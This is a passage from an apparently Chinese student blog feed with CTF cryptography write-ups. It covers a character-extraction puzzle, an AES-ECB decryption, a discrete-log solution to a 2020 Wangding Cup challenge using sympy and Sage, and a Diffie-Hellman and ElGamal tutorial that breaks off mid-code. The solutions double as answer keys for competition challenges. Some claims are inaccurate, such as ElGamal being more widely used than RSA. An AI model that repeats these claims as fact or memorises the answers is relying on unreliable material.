5;f3gg&#125;lffgsag&#125;l3l6d3apd3gd3fd&#125;&#125;aga3ga&#125;a3&#123;6f1f3df&#123;&#123;d&#125;&#125;av3laf&#125;6adf3_d&#123;afa6f&#125;adt&#123;faf&#123;d33aaol3&#125;&#123;l&#125;ld&#125;3yl3a6a&#123;fa6&#125;_d33gf3fll&#125;of&#123;6lad&#125;&#125;fdx&#125;6d&#123;f&#125;ll63ugag66d&#123;6f3&#125;33&#125;al6l&#123;ffwf&#123;&#125;&#123;fl3a36ogg3&#123;&#125;&#125;g6&#125;3hl&#125;6dg6ld&#123;digaa&#125;g&#125;&#123;&#123;l&#125;da&#123;ddg3&#123;&#123;d&#125;w3&#125;ld&#125;adgg3m&#123;lad&#123;gd&#123;a&#123;7afff&#125;&#123;d6&#125;fsf3&#123;f&#125;gflgavfldg6a6&#123;ldqf&#125;fd&#123;f3f3&#125;73ddad&#123;666fz6&#125;d&#123;3&#123;l36a1d6fal3fl6lrl&#123;&#125;aga&#123;fdlsa&#125;&#123;6l6ag3gtgdg&#123;6lgf3f</span></span><br></pre></td></tr></table></figure>

<p> 看着挺迷，开始还以为又是MT类型的题目，当我把可能出现key中的字符给提取出来后，发现并不多；脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cstring = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#123;&#125;_0123456789&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;qdfl33&#123;6&#123;6gs3afa6&#123;3&#125;agf&#123;&#125;aagdf&#125;6fl36d&#123;dfl&#123;6ay6gafddfg&#125;&#123;j3f&#125;&#125;6la&#123;3&#125;bfdf3&#125;gla&#125;65&#125;lg6g6dflf0&#123;dfgd3fdfgc&#123;g6a&#125;a3&#123;6&#125;mfa&#123;&#125;f&#125;f&#125;&#125;&#125;3363&#125;&#125;f6a6a7g&#123;a&#125;g66&#123;d3xgfffg&#125;a&#125;3&#125;_&#123;lad&#125;a33ga5fd33&#125;&#123;&#123;dl&#125;&#123;&#125;f&#123;3da&#125;g&#125;3egfal&#123;a3l&#125;3f33&#125;dfdda&#123;3sa&#123;d6g&#123;ff&#125;6vgl33d6g333h&#123;gd&#123;&#123;lg6ldg&#123;ad&#123;3333a6oalf6a&#123;33&#123;de3&#123;fa&#125;ggl&#123;abfd&#125;6&#125;6&#125;&#125;l33fa&#125;f&#123;&#123;3&#123;3fla&#125;a6&#125;af&#125;&#123;amg&#125;&#123;&#123;d&#125;&#125;a6gallfg36&#123;g3dh&#123;&#123;&#123;a&#123;lfg3&#123;sll6g6gfaggid6d&#123;3afl&#125;3rff3gfad3d&#125;1dlllff6&#125;6&#125;h3g66gla336b&#123;6d3gf&#125;f&#123;30d63l&#125;3dfl6a3llfgld3&#123;&#125;qg&#125;gf&#125;dg&#123;6l&#125;3gal&#125;agdl6&#123;lg&#123;g&#125;ddfaaealf&#123;f3llgge3ad3&#123;3adf&#123;c&#125;fllf6f&#125;3at&#123;aag&#125;a66d3&#125;ad&#123;dfg&#123;&#125;dlz6gld&#125;6&#123;3flxgf&#123;3g3ald&#125;3g&#125;g63f6ggf3&#125;gfd&#125;f3ga3efllf6&#125;363fu6366fdlggfx6&#125;6l3&#125;&#125;a&#123;afg&#123;&#123;&#125;&#125;3fdaluaa&#125;al&#123;dg3dpfga&#125;&#125;l&#125;d3l4afg&#125;f&#123;d&#123;lgcfgffglal&#125;dq6l&#125;fgflldavdad6&#125;df&#123;&#125;dw&#125;l6g&#125;&#125;&#123;l3gf6fdaa66aadt&#125;f6lg&#123;dg33h&#123;fa3d&#123;&#125;laao3l6aal&#123;lfdv&#123;3dlf6af36bddg&#125;3ggad3o&#125;&#123;&#125;3g3fgddyffd3lddgdd6&#123;gdfl&#123;&#123;la3ild&#125;dg&#123;g&#125;dgef&#123;a3&#123;d6dfgq3adll&#123;fdadt&#125;66fdflg&#123;3x&#123;l3ll&#125;3&#123;&#123;g4a3af6lag3gdaf66dadg6dfglaf66l3f&#123;2&#125;6&#123;afaf&#125;3l6all&#125;&#123;l&#125;lfdla6&#123;fgff&#123;&#125;g13dl&#123;a&#123;6&#123;l6rd6&#125;&#125;l3dgg3_f&#123;66gll&#123;f6a3d3dga6&#123;lg&#125;&#123;g&#125;d&#123;6&#123;d36lll3dd6&#123;3dg3afal&#125;d&#125;gff26&#125;l&#125;al&#125;&#125;&#123;a6&#125;g66gaaff&#125;0fga&#123;g6dfld&#123;&#123;&#125;fglf&#123;af&#125;iddf6g6&#125;l361&#123;ag&#125;&#123;&#123;dlfak&#125;&#123;d3fa&#123;6&#123;godgg&#123;l36a&#123;gmllgfa3fa&#123;&#125;f&#125;&#125;3&#123;a6&#123;a3&#123;nafg&#123;l3d6&#125;g2lf6&#123;gg&#125;&#123;g&#125;sg&#123;ga&#123;63g&#123;&#125;la6g&#123;g6&#123;&#123;63o6&#123;l&#125;&#123;3&#125;l3ag36&#123;af33g3dw6d33f3lfdan&#123;dddad&#123;&#123;6l6&#125;&#125;fad63lgd1ffaa&#125;g&#125;3flkg3d&#125;aalf3lbgf&#123;g&#125;f&#125;&#125;d3agf&#123;ld&#123;dl3l4fl&#123;&#123;3fla&#125;&#125;r3g&#125;&#123;&#125;gda&#123;&#125;_df3g&#125;fa36gq&#125;la&#123;f&#123;6l&#125;66fgdg&#125;6ag6feaal6all3&#123;d&#125;lfgl&#125;&#125;&#123;&#123;6lal&#125;gf&#125;&#125;gfgd4d&#123;g36daff&#125;l6fd63ag6&#125;f7&#125;l3&#123;&#123;d&#125;&#123;al6lff66gda&#125;f7dfaf6&#125;fd3ldfgfl36gf337a6al663afd&#123;dff&#125;6&#125;df&#123;lt&#125;66&#125;ag6a3&#123;na&#125;3la&#123;6daa&#125;63fgldf3ggcl6dd&#123;3fg&#123;&#125;&#125;gfgaf&#123;633lpfadalldgglg&#123;l&#125;&#123;6&#125;gf&#123;agf6&#123;3l3a366wa6l6&#125;fdla&#125;wfl&#125;33&#125;d&#123;6d6aa&#125;laldag&#125;bgaa3gff&#125;3db&#123;gd&#125;lfga3&#123;&#125;ffddd6&#125;&#123;la4&#125;3&#123;agdg3&#123;&#125;bf33adg3a632d&#125;66f&#125;dgd67&#125;&#123;333dfg&#125;&#125;mgg3all3l&#125;fd6dd3&#123;g&#125;&#123;&#125;&#125;v6&#125;a6f6lgd3nfgg6aff3a&#125;d3da&#123;l3ldldz&#123;&#125;&#123;&#125;g3&#125;6fdg6f&#123;gd&#123;g3adx&#123;gll6&#123;fg3dc63lf&#125;6dl&#123;d63f3g&#123;3adda5f3dgfla3&#123;6&#125;gd&#123;3&#123;d6dlldal6g66&#125;&#123;ddp&#125;lalafd&#125;d&#123;lgl&#125;g6g33agjg&#125;33dgf&#125;lg0adlda6gfdlx&#123;3g&#125;&#123;g3a&#123;a76&#125;gdf3la&#125;lh&#125;l&#123;l&#123;&#125;&#125;a6gm&#123;gdd&#123;agg&#125;6xfgg&#125;&#123;336&#125;d_a&#123;df3&#125;df33jgf&#125;6d3&#125;&#125;f&#125;h3l&#123;6ga6fll2&#125;dd&#123;l36d66&#125;ldafdlga3gbgd&#125;d6df&#125;ff1gf6a&#123;ll3a3w&#123;3g&#125;allfafldal&#125;aal&#125;dlra33l3f&#125;3dff&#123;6&#123;6&#125;f&#125;la&#125;lgf&#125;&#125;&#125;gd&#123;f3z3l3&#123;d3636dpl3fag3&#123;faa1&#123;3ga33l&#125;6ll6&#123;gg6&#125;ddf&#125;t6g&#125;&#123;gl6ggl&#123;d&#125;aafalf&#123;lw6a&#123;dad&#125;&#125;a3x&#123;ada&#123;fg6d&#125;a3g&#123;d&#123;fggdawdfal&#123;&#123;3dlfndl636&#125;36alv633ada6gf6hd&#123;3l66ddlfpglda&#125;&#123;g3fdogdfa3&#125;3g&#125;3k3d3gda33&#125;dvd&#125;laa&#123;fa&#123;a&#123;&#123;&#125;a&#125;36&#125;&#125;&#125;&#123;r6d6&#123;a6&#125;&#125;6&#123;0laa36gd&#123;36kf63a&#123;3&#125;gga4af6&#125;f3gfgf0lf&#123;6g&#125;&#123;&#123;6&#125;pafg6dg&#125;g6&#123;b&#125;3d36ad6d&#123;h6f3agff&#125;63p&#125;&#123;l3ag3&#125;lf1f3dgd&#123;66a37&#125;&#125;&#125;d6gglaftaf3l6a3&#123;&#123;a7&#123;lgd3d&#125;fl6tlfl663lgg3wa&#125;33gl&#125;d&#123;3i6aaagl6&#123;&#123;&#125;n3gd&#125;l3l6&#125;l7a&#123;gf&#123;a&#125;l&#125;f3al&#123;alg63fln&#123;&#123;dd&#125;3l&#123;ll1&#125;&#123;3g&#125;6&#123;6&#125;&#123;u63&#123;f3&#123;g6lgf&#123;3d&#125;&#123;636&#125;&#123;u3&#125;&#123;f6d&#123;&#123;d3lg&#123;3l6aldf&#123;i&#123;f366&#123;f3l&#123;eg&#123;d&#123;gll&#123;3dhgdgfgaf&#123;&#125;&#125;g&#125;&#123;lg3&#123;a&#123;flm&#125;fa3ldf&#123;d32fagllf&#123;&#123;66q363&#125;dl66gg2fa6af6d6g37lffl&#123;d&#123;3lltgl33&#125;&#125;&#123;&#125;d3o&#123;lfld3d&#123;&#125;a6a663a66&#123;fabfd6ld333g3rafa&#125;&#125;fddfgt&#123;ggad3ag&#125;lr63af6lgg&#125;gy&#123;6&#123;&#123;6&#125;6dd626&#123;gl6a&#123;ad3b3df&#125;alf3afdaf66ll&#125;lf6jd&#125;3&#123;6dldfgg&#125;f3lg63l&#123;lr3ff3l&#123;gafaa&#125;f&#125;agl6l33xglfggg&#123;&#123;&#123;fq66&#125;g6lfa3&#123;736lllflalglf&#125;&#123;&#125;gf&#123;aggdg3&#123;a&#125;&#125;da&#123;fp6fglla3l&#125;65gf36&#123;l6dl&#125;g&#125;f&#123;la6&#123;l&#123;fpf&#123;&#125;63&#123;f6gdfaalf6&#123;dffgdgf&#123;lgaf&#123;f&#123;56&#125;g6af63l6a&#125;a&#125;&#123;lfa&#123;3gblda&#125;l&#125;&#123;fl&#123;s&#123;g&#125;&#125;6&#123;g6la56g6g3&#123;f&#125;ddfaa&#123;l&#125;dg6g&#125;0glda6&#123;6d&#125;ff&#125;f&#123;6laadd6zaag&#123;l3l&#125;6dc&#125;f3gg&#125;lffgsag&#125;l3l6d3apd3gd3fd&#125;&#125;aga3ga&#125;a3&#123;6f1f3df&#123;&#123;d&#125;&#125;av3laf&#125;6adf3_d&#123;afa6f&#125;adt&#123;faf&#123;d33aaol3&#125;&#123;l&#125;ld&#125;3yl3a6a&#123;fa6&#125;_d33gf3fll&#125;of&#123;6lad&#125;&#125;fdx&#125;6d&#123;f&#125;ll63ugag66d&#123;6f3&#125;33&#125;al6l&#123;ffwf&#123;&#125;&#123;fl3a36ogg3&#123;&#125;&#125;g6&#125;3hl&#125;6dg6ld&#123;digaa&#125;g&#125;&#123;&#123;l&#125;da&#123;ddg3&#123;&#123;d&#125;w3&#125;ld&#125;adgg3m&#123;lad&#123;gd&#123;a&#123;7afff&#125;&#123;d6&#125;fsf3&#123;f&#125;gflgavfldg6a6&#123;ldqf&#125;fd&#123;f3f3&#125;73ddad&#123;666fz6&#125;d&#123;3&#123;l36a1d6fal3fl6lrl&#123;&#125;aga&#123;fdlsa&#125;&#123;6l6ag3gtgdg&#123;6lgf3f&#x27;</span></span><br><span class="line"></span><br><span class="line">space = <span class="string">&#x27;&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">11</span> == <span class="number">0</span>:</span><br><span class="line">        space += cipher[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key += cipher[i]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(space)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> key[i:i+<span class="number">10</span>]:</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> flag:</span><br><span class="line">            flag.append(j)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>出来是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;d&#x27;, &#x27;f&#x27;, &#x27;l&#x27;, &#x27;3&#x27;, &#x27;&#123;&#x27;, &#x27;6&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;&#125;&#x27;]</span><br></pre></td></tr></table></figure>

<p>直接手撕就好了</p>
<h2 id="妈呀，完了"><a href="#妈呀，完了" class="headerlink" title="妈呀，完了"></a>妈呀，完了</h2><p>有一串01串和一张图片</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure>

<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/hint.png" alt="hint"></p>
<p>还给了hint</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">图文无关，和妈呀有关</span><br></pre></td></tr></table></figure>

<p>首先根据01串得到字符很简单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = <span class="string">&#xx27;</span></span><br><span class="line">cipher = cipher.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DSy3JyKvPCPmH4WCz+ThWi2FgKo9eSPU4e5g+jZU3FrWNvLM55kEf1hEmNru+NE3</span><br></pre></td></tr></table></figure>

<p>（战略性空一行）</p>
<p>挺费解，看了别的师傅的WP还是有点懵，首先对AES还是不太熟悉，其次为什么要设置utf-8编码，很多网站都不支持的</p>
<p>这里复述一遍过程吧</p>
<p>出题人想要我们通过妈呀、图片信息等推出密钥是20121221，也就是世界末日</p>
<p>然后知道密钥后，可以想到AES的ECB模式，因为这个模式不需要偏移量iv，然后在线往网站进行破解</p>
<p>其参数设置如下</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210707210440790.png" alt="image-20210707210440790"></p>
<p>出来的flag是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;第13个伯克盾将会结束&#125;</span><br></pre></td></tr></table></figure>

<p>对分组密码还是不很了解啊</p>
]]></content>
      <categories>
        <category>密码学军火库</category>
        <category>CTF-Crypto零星考点</category>
        <category>RSA</category>
      </categories>
      <tags>
        <tag>(e, phi) != 1</tag>
        <tag>有限域开方</tag>
        <tag>CopperSmith已知明文高位</tag>
        <tag>Related Message Attack</tag>
      </tags>
  </entry>
  <entry>
    <title>DH协议及ElGamal加密方案的实现</title>
    <url>/posts/898249b7/</url>
    <content><![CDATA[<p>这次做到离散对数的密码，虽然原理跟着老师走了一遍，但是没有什么实战经历没有什么感觉，这里用一道题入手吧</p>
<span id="more"></span>

<h1 id="DH协议及ElGamal加密方案的实现"><a href="#DH协议及ElGamal加密方案的实现" class="headerlink" title="DH协议及ElGamal加密方案的实现"></a>DH协议及ElGamal加密方案的实现</h1><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>先介绍下前导知识</p>
<blockquote>
<p>离散对数，DL（Discrete Logarithm）</p>
</blockquote>
<p>从la佬博客la来的话</p>
<p>在任何群$G$中可为所有整数$k$定义一个幂数为$b^k$，而离散对数$log^b_a$是指使得 $b^k=a$的整数$k$。离散对数在一些特殊情况下可以快速计算。然而，通常没有具非常效率的方法来计算它们。公钥密码学中几个重要算法的基础，是假设寻找离散对数的问题解，在仔细选择过的群中，并不存在有效率的求解算法。</p>
<blockquote>
<p>密钥交换协议，DH（Diffie Hellman）</p>
</blockquote>
<p>就是以下面两位帅气大佬的名字命名的</p>
<p>本质上也是一种密码方案，只是因存在重大安全问题无法抵御中间人攻击而无任何实用性，但是其思想是ElGamal加密的基石</p>
<img alt="DH协议及ElGamal加密方案的实现-125e55ac.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-125e55ac.png" width="" height="" >

<blockquote>
<p>ElGamal加密算法</p>
</blockquote>
<p>是这位来自埃及的大佬发明的</p>
<p>是比RSA使用更广，也就是更安全高效的密码方案</p>
<img alt="DH协议及ElGamal加密方案的实现-a4564ef7.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-a4564ef7.png" width="" height="">


<h2 id="2020网鼎杯-青龙组-you-raise-me-up"><a href="#2020网鼎杯-青龙组-you-raise-me-up" class="headerlink" title="2020网鼎杯-青龙组-you raise me up"></a>2020网鼎杯-青龙组-you raise me up</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = random.randint(<span class="number">2</span>, n-<span class="number">1</span>) | <span class="number">1</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(flag), n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;m = &#x27;</span> + <span class="built_in">str</span>(m)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line"><span class="comment"># c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br></pre></td></tr></table></figure>

<p>已知<br>$$<br>n=2^{512}\<br>c=m^{flag}\ mod\ n<br>$$<br>求$flag$</p>
<p>显然按照一般的思维来说，这就是离散对数问题，找到这个指数flag是困难的，所以针第二个条件我们没有办法，所以我们就可以从n入手</p>
<p>想必n是2的512次方，比较特殊，然后可以直接求phi(n)，<br>$$<br>\phi(n)=2^{511}<br>$$</p>
<h3 id="关于求欧拉函数"><a href="#关于求欧拉函数" class="headerlink" title="关于求欧拉函数"></a>关于求欧拉函数</h3><p>关于这一步求欧拉函数，我还遇到一个小插曲，由于之前的结论<br>$$<br>(p, q)=1,n=pq\Rightarrow \phi(n)<br>=(p-1)\times(q-1)<br>$$<br>从这里来的惯性思维，我一直理解不了为什么不是$\phi(2^{512})=(2-1)^{512}=1$，虽然显然这个是错的</p>
<p>然后在查资料的过程中，发现了不少宝藏，这里有个师傅总结的求欧拉函数的方法，整理得太好了<br><a href="https://blog.csdn.net/paxhujing/article/details/51353672">https://blog.csdn.net/paxhujing/article/details/51353672</a></p>
<h4 id="第一种情况"><a href="#第一种情况" class="headerlink" title="第一种情况"></a>第一种情况</h4><p>若$n=1$，则<br>$$<br>\phi(n)=1<br>$$</p>
<h4 id="第二种情况"><a href="#第二种情况" class="headerlink" title="第二种情况"></a>第二种情况</h4><p>若$n$是质数，则<br>$$<br>\phi(n)=n-1<br>$$</p>
<h4 id="第三种情况"><a href="#第三种情况" class="headerlink" title="第三种情况"></a>第三种情况</h4><p>若$p$是质数，$k\ge1$，则<br>$$<br>\phi(p^k)=p^k-p^{k-1}=p^k(1-\frac{1}{p})<br>$$<br>这个有必要证明下，因为上面用到的就是这条性质</p>
<p>还是枚举法，在$[1,p^k]$，显然只有$p,2p,3p,p^{k-1}p$与之不互素，那互素的数的个数不得是$p^k-p^{k-1}$</p>
<h4 id="第四种情况"><a href="#第四种情况" class="headerlink" title="第四种情况"></a>第四种情况</h4><p>也就是RSA里面常见的，这个我之前也在作业里证明过，注意p和q不一定要是质数</p>
<p>若$n=p\times q$且$(p,q)=1$，则<br>$$<br>\phi(n)=\phi(p)\times \phi(q)=(p-1)\times (q-1)<br>$$</p>
<h4 id="第五种情况"><a href="#第五种情况" class="headerlink" title="第五种情况"></a>第五种情况</h4><p>也是求欧拉函数的通式</p>
<p>由FTA可知，任何一个大于1的整数n，可以拆分为一系列素数幂的积$n=p^{k_1}_1p^{k_2}_2…p^{k_r}_r$，由三、四情况的结论可知<br>$$<br>\phi(n)=p^{k_1}_1p^{k_2}_2…p^{k_r}_r(1-\frac{1}{p_1})(1-\frac{1}{p_2})…(1-\frac{1}{p_r})<br>$$</p>
<p>即<br>$$<br>\phi(n)=n(1-\frac{1}{p_1})(1-\frac{1}{p_2})…(1-\frac{1}{p_r})<br>$$</p>
<hr>
<p>那么有了第三种情况的结论，我之前的疑问也得到了解答</p>
<p>但是回到题目，虽然我们知道了phi(n)，但是已知的RSA常见攻击，并没有针对phi(n)泄漏的，毕竟e和d都是未知</p>
<p>所以这道题的思路还是要转到我们今天要讲的DLP上，AKA离散对数分解问题</p>
<h2 id="DLP"><a href="#DLP" class="headerlink" title="DLP"></a>DLP</h2><p>这里必须引入一些解DLP问题的方法，正如RSA中解大数分解问题一样，某些特殊的情况会让原本安全的加密变得有漏洞</p>
<blockquote>
<p>还是一样，先使用，后搞懂</p>
</blockquote>
<p>sage yyds</p>
<ul>
<li>通用的求离散对数的方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">discrete_log(a,base,<span class="built_in">ord</span>,operation)</span><br></pre></td></tr></table></figure>

<p>其中包含pohlig-hellman算法</p>
<ul>
<li>Pollard-Rho算法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">discrete_log_rho(a,base,<span class="built_in">ord</span>,operation)</span><br></pre></td></tr></table></figure>

<ul>
<li>Pollard-kangaroo算法（lambda算法）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">discrete_log_lambda(a,base,bounds,operation)</span><br></pre></td></tr></table></figure>

<ul>
<li>大步小步算法（BSGS）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bsgs(base,a,bounds,operation)</span><br></pre></td></tr></table></figure>

<p>至于它们的使用和适用条件，先看la佬的博客吧，这里就不展开了，主要也不会DX</p>
<hr>
<p>回到题目，网上的解法是，因为模数n比较特殊，phi(n)可以得到完全分解，这就符合pohlig-hellman的条件，理论上可行</p>
<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><p>收集一下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(discrete_log(n, c, m)))</span><br></pre></td></tr></table></figure>

<p>主要有两个线程的库可以用，一个是sage自带的，一个是python中sympy库里的，不过sympy里的比较简单</p>
<img alt="DH协议及ElGamal加密方案的实现-a4040bae.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-a4040bae.png" width="" height="" >

<p>就是求$flag=log^a_b\ mod\ n$</p>
<p>sage里的比较讲究，需要用Mod函数将m和c框定在模n的群里之类的意思吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line"></span><br><span class="line">m = Mod(m, n)</span><br><span class="line">c = Mod(c, n)</span><br><span class="line"></span><br><span class="line">discrete_log(c, m)</span><br></pre></td></tr></table></figure>

<hr>
<p>前面对离散对数问题有了一个初步的概念，下面我们就进入正题，看看DH协议和ElGamal加密方案的实现</p>
<h2 id="DH协议"><a href="#DH协议" class="headerlink" title="DH协议"></a>DH协议</h2><p>更准确的说法应该是密钥交换协议，其实前面说它也是一种密码方案，不是很准确，因为它并不能加密指定的明文，而是生成双方都知晓，但攻击者却得不到的秘密私钥</p>
<p>它的流程如下</p>
<ol>
<li><p>指定一个安全质数p，要求p最好是2048位的，然后在$\mathbb{Z}^*_p$中找到一个生成元g（emmmmm有效找生成元的算法不会咋整），这些Eve也能知道</p>
</li>
<li><p>Alice选一个私钥x，$x\in \mathbb{Z} _{p-1}$（主要是x是在[1, p-1]这个范围里面的，但至于为什么有点忘了），得到$T_A=g^x\ mod\ p$，并将$T_A$传给Bob</p>
</li>
<li><p>同理，Bob将$T_B=g^y\ mod\ p$发给Alice，其中$T_A,T_B$，Eve也都知晓</p>
</li>
<li><p>此时，Alice可以得到$K_A=(T_B)^{x}=(g^y)^x=g^{xy}$</p>
</li>
<li><p>Bob也可以得到$K_B=(T_A)^{y}=(g^x)^y=g^{xy}$</p>
</li>
</ol>
<p>显然$K_A=K_B$，Alice和Bob从此有了他们才知道的相同的信息，对称密码的福音？</p>
<p>Eve虽然知道$T_A$和$T_B$，但由于离散对数问题的存在，他无法逆向得到x和y，也就得不到$g^{xy}$</p>
<h3 id="DH协议的实现"><a href="#DH协议的实现" class="headerlink" title="DH协议的实现"></a>DH协议的实现</h3><p>老师给的这篇链接里有一些要用到的算法，不过是C的，Python就是屑，sage yyds</p>
<p><a href="https://www.techiedelight.com/elgamal-encryption-algorithm-c/">https://www.techiedelight.com/elgamal-encryption-algorithm-c/</a></p>
<p>改脚本是第一生产力，借鉴了里面求生成元的算法，改成Python的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_t</span>(<span class="params">a, m, n</span>):</span></span><br><span class="line">    y = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> m &gt; <span class="number">0</span>:</span><br><span class="line">        r = m % <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            y = (y * a) % n</span><br><span class="line">        a = a * a % n</span><br><span class="line">        m = m // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primitive_root</span>(<span class="params">pi</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, pi):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, pi):</span><br><span class="line">            <span class="keyword">if</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i &lt; pi - <span class="number">1</span>:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> flag <span class="keyword">and</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i == pi - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>

<p>原根就是最小生成元</p>
<p>但是可以看出这个算也是遍历到p的，妥妥的brute-force，32位的p都跑不出来，感觉和我的差不多</p>
<p>所以最后p取得16位，复现了上面DH协议的流程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> sage <span class="keyword">import</span> my_gcd, my_ord, l_pow</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_t</span>(<span class="params">a, m, n</span>):</span></span><br><span class="line">    _y = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> m &gt; <span class="number">0</span>:</span><br><span class="line">        r = m % <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            _y = (_y * a) % n</span><br><span class="line">        a = a * a % n</span><br><span class="line">        m = m // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> _y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primitive_root</span>(<span class="params">pi</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, pi):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, pi):</span><br><span class="line">            <span class="keyword">if</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i &lt; pi - <span class="number">1</span>:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> flag <span class="keyword">and</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i == pi - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p 